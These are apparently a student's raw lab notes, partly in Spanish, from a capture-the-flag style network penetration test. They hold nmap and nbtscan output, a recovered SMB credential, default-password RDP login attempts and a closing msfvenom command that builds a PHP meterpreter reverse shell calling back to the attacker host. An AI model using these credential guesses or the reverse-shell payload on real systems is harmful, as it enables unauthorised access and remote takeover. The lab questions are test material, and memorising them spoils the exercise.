https://hackviser.com/tactics/pentesting/services/rdp

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/php/meterpreter/reverse_tcp.md

## NMAP
```bash
root@kali:~# nmap -sn 192.168.100.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 21:13 IST
Nmap scan report for ip-192-168-100-1.us-west-1.compute.internal (192.168.100.1)
Host is up (0.00011s latency).
MAC Address: 06:3E:CC:B3:A9:8B (Unknown)
Nmap scan report for ip-192-168-100-50.us-west-1.compute.internal (192.168.100.50)
Host is up (0.00016s latency).
MAC Address: 06:35:24:AE:0F:7D (Unknown)
Nmap scan report for ip-192-168-100-51.us-west-1.compute.internal (192.168.100.51)
Host is up (0.00016s latency).
MAC Address: 06:4D:B8:4A:0C:E5 (Unknown)
Nmap scan report for ip-192-168-100-52.us-west-1.compute.internal (192.168.100.52)
Host is up (0.00016s latency).
MAC Address: 06:C6:16:9C:4E:29 (Unknown)
Nmap scan report for ip-192-168-100-55.us-west-1.compute.internal (192.168.100.55)
Host is up (0.00014s latency).
MAC Address: 06:EA:BD:7D:6A:A7 (Unknown)
Nmap scan report for ip-192-168-100-63.us-west-1.compute.internal (192.168.100.63)
Host is up (0.00011s latency).
MAC Address: 06:44:DF:E3:EF:05 (Unknown)
Nmap scan report for ip-192-168-100-67.us-west-1.compute.internal (192.168.100.67)
Host is up (0.00015s latency).
MAC Address: 06:0E:6C:5D:F0:0B (Unknown)
Nmap scan report for ip-192-168-100-5.us-west-1.compute.internal (192.168.100.5)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 1.83 seconds
```


## Escano Puerto 139 
```bash
root@kali:~# nmap -p 139 --open 192.168.100.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 21:14 IST
Nmap scan report for ip-192-168-100-50.us-west-1.compute.internal (192.168.100.50)
Host is up (0.00059s latency).
PORT    STATE SERVICE
139/tcp open  netbios-ssn
MAC Address: 06:35:24:AE:0F:7D (Unknown)

Nmap scan report for ip-192-168-100-51.us-west-1.compute.internal (192.168.100.51)
Host is up (0.00044s latency).
PORT    STATE SERVICE
139/tcp open  netbios-ssn
MAC Address: 06:4D:B8:4A:0C:E5 (Unknown)

Nmap scan report for ip-192-168-100-52.us-west-1.compute.internal (192.168.100.52)
Host is up (0.00046s latency).
PORT    STATE SERVICE
139/tcp open  netbios-ssn
MAC Address: 06:C6:16:9C:4E:29 (Unknown)

Nmap scan report for ip-192-168-100-55.us-west-1.compute.internal (192.168.100.55)
Host is up (0.00029s latency).
PORT    STATE SERVICE
139/tcp open  netbios-ssn
MAC Address: 06:EA:BD:7D:6A:A7 (Unknown)

Nmap done: 256 IP addresses (8 hosts up) scanned in 2.17 seconds
```

## Escaneo IPs informacion
```bash
root@kali:~# nmap -sS -sV -Pn -n  192.168.100.50,51,52
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 21:16 IST
Nmap scan report for 192.168.100.50
Host is up (0.00061s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:35:24:AE:0F:7D (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

map scan report for 192.168.100.51
Host is up (0.0011s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
80/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:4D:B8:4A:0C:E5 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.100.52
Host is up (0.0010s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.41
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
3389/tcp open  ms-wbt-server xrdp
MAC Address: 06:C6:16:9C:4E:29 (Unknown)
Service Info: Hosts: ip-192-168-100-52.us-west-1.compute.internal, IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 73.06 seconds
root@kali:~# 
```

## Listar IP's
```bash
cat nmapscan_sn.txt | grep "192.168.100" | cut -d "(" -f 2 | cut -d ")" -f 1
192.168.100.1
192.168.100.50
192.168.100.51
192.168.100.52
192.168.100.55
192.168.100.63
192.168.100.67
192.168.100.5
```

## Escanear IP Especificas
```bash
root@kali:~# nmap -sS -sV -T4 -Pn -n -O 192.168.100.1,5,50,51,52,55,63,67
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-13 21:24 IST
Nmap scan report for 192.168.100.1
Host is up (0.00021s latency).
All 1000 scanned ports on 192.168.100.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 06:3E:CC:B3:A9:8B (Unknown)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

Nmap scan report for 192.168.100.50
Host is up (0.00072s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:35:24:AE:0F:7D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/13%OT=80%CT=1%CU=35088%PV=Y%DS=1%DC=D%G=Y%M=063524%
OS:TM=693D8C89%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10F%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M230
OS:1NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.100.51
Host is up (0.00085s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:4D:B8:4A:0C:E5 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/13%OT=21%CT=1%CU=33017%PV=Y%DS=1%DC=D%G=Y%M=064DB8%
OS:TM=693D8C89%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M230
OS:1NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.100.52
Host is up (0.00072s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.41
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
3389/tcp open  ms-wbt-server xrdp
MAC Address: 06:C6:16:9C:4E:29 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/13%OT=21%CT=1%CU=43931%PV=Y%DS=1%DC=D%G=Y%M=06C616%
OS:TM=693D8C89%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=102%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Hosts: ip-192-168-100-52.us-west-1.compute.internal, IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.100.55
Host is up (0.00043s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 06:EA:BD:7D:6A:A7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/13%OT=80%CT=1%CU=44624%PV=Y%DS=1%DC=D%G=Y%M=06EABD%
OS:TM=693D8C89%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10C%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.100.63
Host is up (0.00035s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 06:44:DF:E3:EF:05 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 6.X (85%)
OS CPE: cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


Nmap scan report for 192.168.100.67
Host is up (0.00037s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
MAC Address: 06:0E:6C:5D:F0:0B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/13%OT=22%CT=1%CU=39811%PV=Y%DS=1%DC=D%G=Y%M=060E6C%
OS:TM=693D8C89%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10F%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW6%O2=M2301ST11NW6%O3=M2301NNT11NW6%O4=M2301ST11N
OS:W6%O5=M2301ST11NW6%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	Nmap scan report for 192.168.100.5
Host is up (0.000012s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.7p1 Debian 2 (protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
5910/tcp open  vnc           VNC (protocol 3.8)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 0 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 8 IP addresses (8 hosts up) scanned in 105.22 seconds
root@kali:~# 
```

## Enumerar Hosts
192.168.100.1

```bash
192.168.100.50
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
192.168.100.51
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
192.168.100.55
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
192.168.100.63
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
192.168.100.52
cpe:/o:linux:linux_kernel
192.168.100.67
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
192.168.100.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```






xfreerdp /u:Administrator /p:password /v:192.168.100.55
xfreerdp /u:Administrator /p: /v:192.168.100.55
xfreerdp /u:Administrator /p:admin /v:192.168.100.55
xfreerdp /u:Administrator /p:Password123 /v:192.168.100.55
xfreerdp /u:admin /p:admin /v:192.168.100.55
xfreerdp /u:user /p:user /v:192.168.100.55


Administrator:<blank>
Administrator:admin
Administrator:password
Administrator:Password123
:admin
user:user




------------------------------------------------------------------------------
192.168.100.50   WINSERVER-01     <server>  <unknown>        06:35:24:ae:0f:7d
What is the password for the user "mike" on WINSERVER-01?
A system contains the file C:\Users\mike\Documents\flag.txt; what is the value of the flag?
 smbmap -H 192.168.100.50 -u mike -p diamond
[+] IP: 192.168.100.50:445      Name: wordpress.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                    
        
        


root@kali:~# nbtscan 192.168.100.51
Doing NBT name scan for addresses from 192.168.100.51
IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.100.51   WINSERVER-02     <server>  <unknown>        06:4d:b8:4a:0c:e5







root@kali:~# nbtscan 192.168.100.55
Doing NBT name scan for addresses from 192.168.100.55
IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.100.55   WINSERVER-03     <server>  <unknown>        06:ea:bd:7d:6a:a7
What is the password of the "Administrator" user on WINSERVER-03?
What is the password of the user account "mary" on WINSERVER-03?
What is the value of the flag C:\Users\Administrator\flag.txt on WINSERVER-03?

http://192.168.100.55/todo.txt
Greetings gents!

I have setup this server to host our production services.
I will be sharing changelogs and updates on the HTTP File Server.

So far this server does not have any running services, as a result, you must login via RDP or SMB.

- Administrator

-----------------------------------------------------------

Nmap scan report for 192.168.100.55
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 06:EA:BD:7D:6A:A7 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows







root@kali:~# nbtscan 192.168.100.63
Doing NBT name scan for addresses from 192.168.100.63
IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------






msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4411 -f raw -o evil.php








